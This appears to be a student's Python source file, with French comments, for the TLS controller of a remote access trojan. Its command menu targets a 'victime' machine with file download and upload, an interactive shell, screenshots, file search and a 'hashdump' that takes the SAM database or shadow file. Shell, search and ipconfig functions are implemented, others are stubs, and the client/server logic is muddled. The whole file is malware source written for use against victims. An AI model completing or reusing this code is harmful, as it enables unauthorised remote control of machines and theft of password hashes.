import socket
import ssl
import os
import subprocess
import threading

# Global flag for server running state
server_en_cours = True # je definie une variable globale pour savoir si le serveur est en marche ou pas surtout pour la valeur q qui permet de fermer la connexion

# Define the thread class for handling client connections
class ClientThread(threading.Thread):
    def __init__(self, ip, port):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port # 
        print("[+] Nouveau thread démarré pour " + port[0] + ":" + str(port[1])) # affiche un message pour dire que le thread est demarré
        self.ip.settimeout(1.0)  # Set timeout for socket operations

    def run(self):
        print("Connexion avec", self.port) # affiche un message pour dire que la connexion est etablie
        try: # je met un try pour gerer les erreurs
            while server_en_cours: # je boucle tant que le serveur est en marche
                try: # je met un try pour gerer les erreurs
                    data = self.ip.recv(2048) # je recois les donnees
                    if not data: # si je n'ai pas de donnees
                        break # je sors de la boucle
                    print("Le serveur a reçu des données:", data.decode()) # j'affiche un message pour dire que le serveur a recu des donnees
                    cmd = data.decode().strip() # je decode les donnees et je les mets dans une variable cmd
                    if cmd == 'exit': # si la commande est exit
                        break # je sors de la boucle
                    response = rat_command(cmd) # je mets la reponse de la commande dans une variable response
                    self.ip.send(response.encode()) # j'envoie la reponse
                except socket.timeout: # je gere les erreurs de timeout
                    continue # je continue
        except Exception as e: # je gere les erreurs
            print(f"Erreur dans le thread client: {e}") # j'affiche un message d'erreur
        finally: # je mets un finally pour fermer la connexion
            self.ip.close() # je ferme la connexion
            print("Connexion fermée avec", self.port) # j'affiche un message pour dire que la connexion est fermée

# Function to handle commands
def rat_command(cmd):
    if cmd == "help":
        return help() # je retourne la fonction help
    elif cmd == "shell":
        return shell_func() # je retourne la fonction shell_func
    elif cmd == "ipconfig":
        return ipconfig_func() # je retourne la fonction ipconfig_func
    elif cmd.startswith("search"): # si la commande commence par search
        parts = cmd.split(' ', 2) # je split la commande
        if len(parts) < 3: # si la longueur de parts est inferieur a 3
            return "Usage: search <path> <filename>" # je retourne un message d'erreur
        path, filename = parts[1], parts[2] # je mets les parties dans des variables
        return searchfile(filename, path) # je retourne la fonction searchfile
    elif cmd == "upload": # si la commande est upload
        return "Upload command received, but implementation is not here." # je retourne un message d'erreur
    else:
        return f"Commande non reconnue: {cmd}" # je retourne un message d'erreur


host = "127.0.0.1"
port = 9999


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # je cree un socket
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # je mets des options sur le socket
server_socket.bind((host, port)) # je bind le socket
server_socket.listen(5) # je mets le socket en ecoute
print("Serveur: en attente de connexions des clients TCP ...") # j'affiche un message pour dire que le serveur est en attente de connexion


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) # je cree un contexte ssl
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem") # je charge le certificat et la cle privee


commande_disponible = {
    "help": "afficher la liste des commandes disponibles.",
    "download": "récupération de fichiers de la victime vers le serveur.",
    "upload": "récupération de fichiers du serveur vers la victime.",
    "shell": "ouvrir un shell (bash ou cmd) interactif.",
    "ipconfig": "obtenir la configuration réseau de la machine victime.",
    "screenshot": "prendre une capture d'écran de la machine victime.",
    "search": "rechercher un fichier sur la machine victime.",
    "hashdump": "récupérer la base SAM ou le fichier shadow de la machine.",
    "q": "fermer la connexion."
}

def help(): # je definie une fonction help
    if commande_disponible:
        return "\n".join([f"{commande} : {description}" for commande, description in commande_disponible.items()])
    else:
        return "Aucune commande disponible."

def searchfile(name, path): # je definie une fonction searchfile
    for root, dirs, files in os.walk(path):
        if name in files:
            return os.path.join(root, name)
    return "Fichier non trouvé."

def shell_func(): # je definie une fonction shell_func  pas encore utilisable 
    print("Ouverture d'un shell interactif")
    if os.name == "nt":
        shell_command = "cmd"
    else:
        shell_command = "/bin/bash"
    
    process = subprocess.Popen(shell_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    while True:
        cmd = input('shellesgi-# ')
        if cmd.lower() == 'exit':
            break
        
        process.stdin.write(cmd + '\n')
        process.stdin.flush()
        
        output = ""
        while True:
            line = process.stdout.readline()
            if not line:
                break
            output += line
        
        error_output = ""
        while True:
            line = process.stderr.readline()
            if not line:
                break
            error_output += line
        
        if output:
            print(output, end="")
        if error_output:
            print(error_output, end="")
    
    return "Shell session ended."




def ipconfig_func(): # je definie une fonction ipconfig_func
    if os.name == "nt":
        shell_command = "ipconfig"
    else:
        shell_command = "ifconfig"
    process = subprocess.Popen(shell_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output.decode('latin-1') + error.decode('latin-1')


def nouvelles_connexions():
    global server_en_cours
    while server_en_cours:
        try:
            client, addr = server_socket.accept()
            ssl_connection = context.wrap_socket(client, server_side=True)
            client_thread = ClientThread(ssl_connection, addr)
            client_thread.start()
            client_threads.append(client_thread)
        except OSError as e:
            if server_en_cours:
                print(f"Erreur lors de l'acceptation de la connexion: {e}")
            break

if __name__ == "__main__":
    client_threads = []
    accept_thread = threading.Thread(target=nouvelles_connexions)
    accept_thread.start()

    while True:
        cmd = input('esgi-# ')
        if cmd.lower() == 'q':
            server_en_cours = False
            break
        response = rat_command(cmd)
        print(response)
    
    # Close the server socket to stop accepting new connections
    server_socket.close()

    # Wait for all client threads to finish
    for t in client_threads:
        t.join()
    
    print("Serveur arrêté")
